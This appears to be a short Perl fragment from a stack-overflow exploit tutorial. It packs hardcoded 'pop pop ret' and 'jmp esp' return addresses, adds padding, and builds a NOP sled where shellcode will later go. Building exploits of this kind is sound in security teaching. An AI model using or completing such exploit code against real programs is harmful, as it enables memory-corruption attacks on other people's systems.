...
my $eip = pack('V', 0x01B06a10); # pop pop ret found
my $jmpesp = pack('V',0x01d2f23a); # jmp esp

my $prependesp = "XXXX";  #add 4 bytes so ESP points at beginning of shellcode bytes
my $shellcode = "\x90" x 8; # add 8 bytes (NOPs) to simulate shellcode later on memory
$shellcode = $shellcode . $jmpesp; # addres to return via pop pop ret ( = jmp esp)
